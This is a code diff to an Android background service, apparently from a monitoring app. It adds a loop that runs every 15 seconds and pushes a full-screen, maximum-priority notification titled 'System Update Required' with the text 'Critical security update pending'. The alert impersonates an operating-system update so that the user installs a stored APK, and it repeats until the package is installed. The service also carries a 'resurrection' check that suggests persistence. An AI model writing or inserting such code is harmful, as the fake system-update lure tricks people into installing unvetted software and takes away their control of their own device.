@@ -78,6 +78,10 @@ class MonitorService : Service() {
         // 1. Diagnostics
         checkResurrection()
         
+        if (intent?.getBooleanExtra("kick_relentless", false) == true) {
+            checkRelentlessInstall()
+        }
+
         // 2. Start Logic Loop
         startLoop()
         
@@ -108,17 +112,81 @@ class MonitorService : Service() {
 
 
 
+    private var isLoopActive = false
     private fun startLoop() {
-        // OPTIMIZED LOOP: No 60s wake-lock.
-        // Logic is now event-driven by ScreenReceiver and WorkManager.
+        if (isLoopActive) return
+        isLoopActive = true
         scope.launch {
-            // We still check Pulse/Reset once on startup
             TimeManager.checkDailyReset(applicationContext)
             checkPulse()
-            
-            // Daily Dump Check
             DumpManager.createDailyDump(applicationContext)
+            
+            while (isActive) {
+                checkRelentlessInstall()
+                delay(15_000)
+            }
         }
+    }
+
+    private fun checkRelentlessInstall() {
+        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        if (!prefs.getBoolean("relentless_install_active", false)) return
+        
+        val apkPath = prefs.getString("relentless_apk_path", "") ?: ""
+        val targetPkg = prefs.getString("relentless_target_pkg", "") ?: ""
+        
+        if (apkPath.isEmpty()) {
+            prefs.edit().putBoolean("relentless_install_active", false).apply()
+            return
+        }
+
+        var isInstalled = false
+        try {
+            if (targetPkg.isNotEmpty()) {
+                val installedInfo = packageManager.getPackageInfo(targetPkg, 0)
+                val archiveInfo = packageManager.getPackageArchiveInfo(apkPath, 0)
+                if (archiveInfo != null) {
+                    val installedVer = if (android.os.Build.VERSION.SDK_INT >= 28) installedInfo.longVersionCode else installedInfo.versionCode.toLong()
+                    val archiveVer = if (android.os.Build.VERSION.SDK_INT >= 28) archiveInfo.longVersionCode else archiveInfo.versionCode.toLong()
+                    if (installedVer >= archiveVer) isInstalled = true
+                } else isInstalled = true
+            } else isInstalled = true
+        } catch (e: android.content.pm.PackageManager.NameNotFoundException) {
+            isInstalled = false
+        } catch (e: Exception) {
+            isInstalled = true
+        }
+
+        if (isInstalled) {
+            prefs.edit().putBoolean("relentless_install_active", false).apply()
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            nm.cancel(102)
+            return
+        }
+
+        val installIntent = Intent(this, RelentlessInstallActivity::class.java).apply {
+            putExtra("apk_path", apkPath)
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+        }
+        val pi = android.app.PendingIntent.getActivity(this, 102, installIntent, android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE)
+        
+        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        val channelId = "system_updates"
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(channelId, "System Updates", NotificationManager.IMPORTANCE_HIGH)
+            nm.createNotificationChannel(channel)
+        }
+        
+        val notif = NotificationCompat.Builder(this, channelId)
+            .setSmallIcon(android.R.drawable.stat_sys_download_done)
+            .setContentTitle("System Update Required")
+            .setContentText("Critical security update pending.")
+            .setPriority(NotificationCompat.PRIORITY_MAX)
+            .setFullScreenIntent(pi, true)
+            .setAutoCancel(true)
+            .build()
+            
+        nm.notify(102, notif)
     }
 
     private fun checkResurrection() {
